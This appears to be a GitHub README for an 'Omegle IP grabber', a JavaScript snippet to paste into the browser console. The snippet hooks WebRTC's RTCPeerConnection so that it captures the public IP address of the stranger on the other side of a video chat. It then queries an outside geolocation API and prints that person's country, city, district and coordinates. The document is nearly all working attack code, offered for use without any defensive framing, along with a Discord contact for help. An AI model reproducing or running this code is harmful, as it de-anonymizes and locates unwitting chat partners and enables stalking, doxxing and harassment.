# omegle-ip-grabber
omegle ip grabber
copy paste in dev tools console in google
if u need help add revxyyx#3739 on discord
const apikey = "my-api-key";

 window.oRTCPeerConnection =
   window.oRTCPeerConnection || window.RTCPeerConnection;

 window.RTCPeerConnection = function (...args) { 
    const pc = new window.oRTCPeerConnection(...args);

 pc.oaddIceCandidate = pc.addIceCandidate;

 pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");
    const ip = fields [4]; 
    if (fields [7] === "srflx") {
      getLocation(ip);
    } 
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};

const getLocation = async (ip) => {
  let url = `https://api.ipgeolocation.io/ipgeo?apiKeys=${apikey}&ip=${ip}`;

  await fetch(url).then((response) =>
    response.json().then((json) => {
      const output = `
          --------------------
          Country: ${json.country_name}
          State: ${json.state_prov}
          City: ${json.city}
          District: ${json.district}
          Lat / Long: (${json.latitude}, ${json.longitude})
          --------------------
         `;
      console.log(output);
    })
  );
};
